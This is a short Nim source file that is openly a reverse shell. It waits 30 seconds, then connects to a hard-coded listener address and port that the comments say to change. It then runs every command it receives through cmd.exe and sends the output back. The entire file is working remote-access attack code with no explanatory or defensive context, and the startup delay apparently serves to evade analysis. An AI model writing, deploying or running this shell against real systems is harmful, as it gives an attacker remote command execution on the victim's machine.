import net, osproc, os, strformat, times

# Wait for 30 seconds before executing the main logic
sleep(30_000)  # Sleep for 30000 milliseconds (30 seconds)

let
  ip = "192.168.174.128"  # Change this to your listener's IP
  port = 4444           # Change this to your listener's PORT
var
  sock = newSocket()

try:
  sock.connect(ip, Port(port))
  let prompt = "Nim-Shell> "
  while true:
    sock.send(prompt)
    let command = sock.recvLine()
    if command.len == 0 or command == "exit":
      break

    let cmdOutput = try:
    #  if os.hostOS == "windows":
        execProcess(fmt"cmd.exe /C {command}")
    #  else:
    #execProcess(fmt"/bin/sh -c {command}")
    except Exception as e:
      "Error: " & e.msg

    sock.send(cmdOutput & "\n")
finally:
  sock.close()